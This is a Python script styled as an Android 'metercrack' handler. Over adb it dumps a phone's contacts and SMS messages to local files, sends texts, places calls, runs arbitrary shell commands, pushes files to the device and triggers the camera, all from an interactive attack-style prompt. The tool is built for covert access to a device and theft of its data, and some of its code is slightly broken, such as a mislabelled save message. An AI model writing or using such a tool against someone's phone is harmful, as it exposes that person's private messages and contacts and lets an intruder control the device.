import subprocess
import os
from colorama import Fore, init
import shutil
import time

init(autoreset=True)

def run_adb_command(command):
    """Helper function to run adb commands and return output"""
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode('utf-8').strip(), result.stderr.decode('utf-8').strip()

def fetch_contacts():
    """Dump contacts and save to a file"""
    print(Fore.YELLOW + "Fetching contacts...")
    stdout, _ = run_adb_command(['adb', 'shell', 'content', 'query', '--uri', 'content://contacts/phones/'])

    contacts = stdout.splitlines()
    contact_count = len(contacts)
    
    if contact_count > 0:
        phone_number = run_adb_command(['adb', 'shell', 'getprop', 'gsm.device'] )[0].split(":")[1].strip()
        with open(f"contacts_dump_{phone_number}.txt", "w") as file:
            for contact in contacts:
                file.write(contact + "\n")
        print(Fore.GREEN + f"Contacts saved at > contacts_dump_{phone_number}.txt")
    else:
        print(Fore.RED + "No contacts found.")

    return contact_count

def send_sms(destination, text):
    """Send SMS to the destination number"""
    print(Fore.YELLOW + f"Sending SMS to {destination}...")
    stdout, stderr = run_adb_command(['adb', 'shell', 'service', 'call', 'isms', '3', 's16', destination, 's16', text])

    if stderr:
        print(Fore.RED + f"Error sending SMS: {stderr}")
    else:
        print(Fore.GREEN + "SMS SENT!")

def dump_sms():
    """Dump SMS messages"""
    print(Fore.YELLOW + "Fetching SMS messages...")
    stdout, _ = run_adb_command(['adb', 'shell', 'content', 'query', '--uri', 'content://sms/'])

    sms_messages = stdout.splitlines()
    sms_count = len(sms_messages)

    if sms_count > 0:
        phone_number = run_adb_command(['adb', 'shell', 'getprop', 'gsm.device'])[0].split(":")[1].strip()
        with open(f"sms_dump_{phone_number}.txt", "w") as file:
            for sms in sms_messages:
                file.write(sms + "\n")
        print(Fore.GREEN + f"Contacts saved at > sms_dump_{phone_number}.txt")
    else:
        print(Fore.RED + "No SMS found.")

    return sms_count

def make_call(destination):
    """Initiate a phone call to the destination"""
    print(Fore.YELLOW + f"Making a call to {destination}...")
    stdout, stderr = run_adb_command(['adb', 'shell', 'am', 'start', '-a', 'android.intent.action.CALL', f'tel:{destination}'])

    if stderr:
        print(Fore.RED + f"Error initiating call: {stderr}")
    else:
        print(Fore.GREEN + f"Calling {destination}...")

def execute_shell_command(command):
    """Execute a shell command on the Android device"""
    print(Fore.YELLOW + f"Executing shell command: {command}")
    stdout, stderr = run_adb_command(['adb', 'shell', command])
    if stderr:
        print(Fore.RED + f"Error executing shell command: {stderr}")
    else:
        print(Fore.GREEN + f"Command executed successfully:\n{stdout}")

def upload_file(local_file_path, remote_path):
    """Upload a file from local system to Android device"""
    if not os.path.exists(local_file_path):
        print(Fore.RED + f"Error: File {local_file_path} does not exist!")
        return

    print(Fore.YELLOW + f"Uploading file {local_file_path} to {remote_path} on Android device...")
    try:
        # Use adb push to upload the file
        subprocess.run(['adb', 'push', local_file_path, remote_path], check=True)
        print(Fore.GREEN + f"File uploaded successfully to {remote_path}")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error uploading file: {e}")

def take_webcam_snap():
    """Take a snapshot from the webcam"""
    print(Fore.YELLOW + "Taking a snapshot with the webcam...")
    stdout, stderr = run_adb_command(['adb', 'shell', 'am', 'start', '-a', 'android.media.action.IMAGE_CAPTURE'])
    
    if stderr:
        print(Fore.RED + f"Error taking snapshot: {stderr}")
    else:
        print(Fore.GREEN + "Snapshot taken successfully!")

def start_handler():
    """Start handler and execute commands based on inputs"""
    print(Fore.GREEN + "Starting HANDLER in Android mode...")

    # Check if a device is connected
    stdout, _ = run_adb_command(['adb', 'devices'])
    if 'device' not in stdout:
        print(Fore.RED + "No device connected. Please connect a device and try again.")
        return

    # Get device information
    stdout, _ = run_adb_command(['adb', 'shell', 'getprop', 'ro.product.model'])
    device_info = stdout.strip()

    print(Fore.CYAN + f"A CLIENT CONNECTED ({device_info})!")

    while True:
        # Input for the user command
        command = input(Fore.MAGENTA + "metercrack > ").strip().lower()

        if command == "dump_contacts":
            contacts = fetch_contacts()
            print(Fore.YELLOW + f"Fetched {contacts} contacts.")
        elif command.startswith("send_sms"):
            try:
                _, destination, text = command.split(' ', 2)
                send_sms(destination, text)
            except ValueError:
                print(Fore.RED + "Error: Invalid command. Format: send_sms <destination> <text>")
        elif command == "dump_sms":
            sms = dump_sms()
            print(Fore.YELLOW + f"Fetched {sms} SMS messages.")
        elif command.startswith("call"):
            try:
                _, destination = command.split(' ', 1)
                make_call(destination)
            except ValueError:
                print(Fore.RED + "Error: Invalid command. Format: call <destination>")
        elif command.startswith("shell"):
            _, shell_command = command.split(' ', 1)
            execute_shell_command(shell_command)
        elif command.startswith("upload_file"):
            _, local_file, remote_path = command.split(' ', 2)
            upload_file(local_file, remote_path)
        elif command == "take_snapshot":
            take_webcam_snap()
        elif command == "exit":
            print(Fore.GREEN + "Exiting...")
            break
        else:
            print(Fore.RED + "Invalid command!")

if __name__ == "__main__":
    start_handler()
